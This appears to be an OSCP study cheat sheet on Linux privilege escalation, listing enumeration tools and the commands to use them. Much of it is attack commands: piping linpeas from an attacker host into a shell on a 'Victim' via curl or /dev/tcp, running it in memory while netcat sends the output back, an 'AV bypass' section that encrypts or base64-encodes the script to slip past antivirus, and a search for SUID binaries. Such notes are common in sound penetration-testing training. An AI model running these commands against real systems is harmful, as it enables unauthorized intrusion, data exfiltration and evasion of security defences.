---
layer: article
title: Privilege Escalation
tags: oscp
---

## GTFOBins

项目地址：<https://github.com/GTFOBins/GTFOBins.github.io> 和<https://gtfobins.github.io/>

## [BeRoot](https://github.com/AlessandroZ/BeRoot)

## pspy

项目地址: <https://github.com/DominicBreuker/pspy>

包含：稳定版`pspy32` 和`pspy64`和小文件版`pspy32s` 和`pspy64s`

## linpeas.sh

项目地址：<https://github.com/carlospolop/PEASS-ng> 和<https://linpeas.sh/>

```sh
# From github
$ curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

```sh
# Local network
$ sudo python -m SimpleHTTPServer 80 #Host
$ curl 10.10.10.10/linpeas.sh | sh #Victim

# Without curl
$ sudo nc -q 5 -lvnp 80 < linpeas.sh #Host
$ cat < /dev/tcp/10.10.10.10/80 | sh #Victim

# Excute from memory and send output back to the host
$ nc -lvnp 9002 | tee linpeas.out #Host
$ curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 9002 #Victim
```

```sh
# Output to file
$ ./linpeas.sh -a > /dev/shm/linpeas.txt #Victim
$ less -r /dev/shm/linpeas.txt #Read with colors
```

```sh
# Use a linpeas binary
$ wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas_linux_amd64
$ chmod +x linpeas_linux_amd64
$ ./linpeas_linux_amd64
```

### AV bypass

```sh
#open-ssl encryption
$ openssl enc -aes-256-cbc -pbkdf2 -salt -pass pass:AVBypassWithAES -in linpeas.sh -out lp.enc
$ sudo python -m SimpleHTTPServer 80 #Start HTTP server
$ curl 10.10.10.10/lp.enc | openssl enc -aes-256-cbc -pbkdf2 -d -pass pass:AVBypassWithAES | sh #Download from the victim

#Base64 encoded
$ base64 -w0 linpeas.sh > lp.enc
$ sudo python -m SimpleHTTPServer 80 #Start HTTP server
$ curl 10.10.10.10/lp.enc | base64 -d | sh #Download from the victim
```

## linux-exploit-suggester.sh

## linux-exploit-suggester-2.pl

## linuxprivchecker.py

## LinEnum.sh

## SUID 提权

```sh
$ find / -perm -u=s -type f 2>/dev/null
# 或者
$ find / -user root -perm -4000 -print 2>/dev/null
$find / -user root -perm -4000 -exec ls -ldb {} \;
```

参考：<https://www.freebuf.com/articles/others-articles/307232.html>
